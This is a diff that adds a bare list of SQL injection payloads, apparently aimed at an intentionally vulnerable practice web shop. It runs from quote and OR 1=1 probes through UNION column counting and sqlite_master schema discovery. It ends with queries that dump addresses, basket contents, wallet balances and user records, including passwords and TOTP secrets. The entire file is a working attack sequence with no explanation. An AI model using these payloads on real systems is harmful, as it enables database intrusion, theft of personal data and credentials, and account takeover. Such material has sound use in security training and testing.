@@ -1,0 +1,30 @@
+'
+'OR 1=1--
+test'
+test'--
+')
+')--
+'))--
+'))OR 1=1--
+'))OR 1=0--
+'))UNION SELECT 1--
+'))UNION SELECT 1,1,1--
+'))UNION SELECT 1,1,1,1,1--
+'))UNION SELECT 1,1,1,1,1,1,1--
+'))UNION SELECT 1,1,1,1,1,1,1,1,1--
+'))UNION SELECT type,1,1,1,1,1,1,1,1 FROM sqlite_master--
+'))WHERE id=-1 UNION SELECT type,1,1,1,1,1,1,1,1 FROM sqlite_master--
+'))AND id=-1 UNION SELECT type,1,1,1,1,1,1,1,1 FROM sqlite_master--
+'))AND id=-1 UNION SELECT type, name, tbl_name, rootpage, sql,1,1,1,1 FROM sqlite_master--
+'))AND id=-1 UNION SELECT tbl_name,1,1,1,1,1,1,1,1 FROM sqlite_master--
+'))AND id=-1 UNION SELECT sql,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE tbl_name='Addresses'--
+'))AND id=-1 UNION SELECT fullName,mobileNum,streetAddress,city,1,1,1,1,1 FROM Addresses--
+'))AND id=-1 UNION SELECT tbl_name,1,1,1,1,1,1,1,1 FROM sqlite_master--
+'))AND id=-1 UNION SELECT sql,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE tbl_name='BasketItems'--
+'))AND id=-1 UNION SELECT productId,quantity,1,1,1,1,1,1,1 FROM BasketItems--
+'))AND id=-1 UNION SELECT tbl_name,1,1,1,1,1,1,1,1 FROM sqlite_master ORDER BY tbl_name DESC--
+'))AND id=-1 UNION SELECT sql,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE tbl_name='Wallets'--
+'))AND id=-1 UNION SELECT UserId,balance,1,1,1,1,1,1,1 FROM Wallets--
+'))AND id=-1 UNION SELECT tbl_name,1,1,1,1,1,1,1,1 FROM sqlite_master ORDER BY tbl_name DESC--
+'))AND id=-1 UNION SELECT sql,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE tbl_name='Users'--
+'))AND id=-1 UNION SELECT username,email,password,role,totpSecret,1,1,1,1 FROM Users--
